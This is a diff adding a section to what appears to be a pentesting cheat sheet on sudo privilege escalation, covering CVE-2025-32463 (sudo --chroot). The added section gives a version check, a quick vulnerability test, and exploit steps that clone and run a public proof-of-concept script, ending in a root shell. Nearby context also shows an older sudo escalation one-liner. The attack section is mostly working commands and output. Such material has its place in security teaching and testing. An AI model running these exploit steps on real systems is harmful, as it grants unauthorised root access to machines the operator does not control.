@@ -294,6 +294,42 @@ sudo -u#-1 /bin/bash
 root@NIX04:/home/ben# 
 ```
 
+### CVE-2025-32463 - Sudo --chroot Privilege Escalation
+
+* Sudo before 1.9.17p1 allows local users to obtain root access because /etc/nsswitch.conf from a user-controlled directory is used with the --chroot option.
+
+**Detection:**
+
+```bash
+sudo -V
+# Vulnerable if: Sudo version < 1.9.17p1
+```
+
+**Quick Test:**
+
+```bash
+sudo -R woot woot
+# If you see: "sudo: woot: No such file or directory" = likely vulnerable
+```
+
+**Exploit:**
+
+```bash
+# Clone exploit
+git clone https://github.com/pr0v3rbs/CVE-2025-32463_chwoot.git
+cd CVE-2025-32463_chwoot
+
+# Run exploit
+./sudo-chwoot.sh
+
+# Result
+woot!
+root@host:/# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+**Reference:** https://github.com/pr0v3rbs/CVE-2025-32463_chwoot
+
 ## Sudo-Shell escape Sequences
 
 * List the programs which sudo allows your user to run:
